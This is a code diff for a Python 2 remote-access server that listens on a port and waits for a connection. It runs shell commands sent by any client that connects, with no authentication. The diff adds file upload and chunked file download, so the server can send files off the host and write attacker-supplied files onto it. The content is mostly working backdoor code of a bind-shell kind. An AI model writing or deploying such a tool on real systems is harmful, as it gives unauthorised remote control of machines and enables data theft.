@@ -3,6 +3,7 @@ import threading
 import struct
 import shlex
 import subprocess
+import os
 from optparse import OptionParser  
 dl_file = ""
 ul_file = ""
@@ -79,26 +80,40 @@ def run_command(cmd):
         if result == "":
             result = "\r"
     except subprocess.CalledProcessError as e:
-        result = e
+        result = e.__str__()
     return result
 
 def download_file(dl_filename,conn):
     try:
-        data = ""
+        buffsize = 1024
         fd = open(dl_filename,"rb")
-        data = fd.read()
-        print data
+        while True:
+            data = fd.read(buffsize)
+            conn.send(data)
+            if len(data) != 1024:
+                break
         fd.close()
     except Exception as e:
-        data = e.message
-        return False
-    finally:
+        '''send the error __str__()'''
+        data = e.__str__()
         conn.send(data)
+        return False
     return True
 
-def upload_file(file):
-    print "upload_file"
-    return
+def upload_file(ul_filename,conn):
+    try:
+        conn.send(struct.pack("B",0x00))
+        fd = open(os.path.basename(ul_filename),"wb")
+        while True:
+            data = conn.recv(1024)
+            fd.write(data)
+            if len(data) != 1024:
+                break
+        fd.close()
+    except Exception as e:
+        print e
+        return False
+    return True
 
 def main():
     global dl_file
@@ -116,7 +131,7 @@ def main():
     while True:
         (conn,addr) = server_start(bind_ip,bind_port)
         if addr is None:
-            bind_port = bind_port - 1
+            bind_port -= 1
             continue
         print "[+] Connected by %s:%d" % (addr[0],addr[1])
         while True:
@@ -128,18 +143,27 @@ def main():
                 print "[-] Connection closed!"
                 break
             (cmd,act_type) = cmd_parse(recv_data)
-            if act_type == 0:
+            if act_type == 0x00:
                 '''do run command action'''
                 send_data = run_command(cmd)
-            elif act_type == 1:
+            elif act_type == 0x01:
                 '''download file action'''
                 if download_file(cmd,conn):
                     print "[+] download %s successed!" % cmd
                 else:
                     print "[-] download %s failure!" % cmd
                 send_data = "\r"
+            elif act_type == 0x02:
+                '''download file action'''
+                if upload_file(cmd,conn):
+                    print "[+] upload %s successed!" % cmd
+                else:
+                    print "[-] upload %s failure!" % cmd
+                send_data = "\r"
             elif act_type == 0xff:
                 print "[*] exited process.."
-                exit()
+                exit(0)
+            else:
+                continue
             server_send(conn,send_data)
 main()
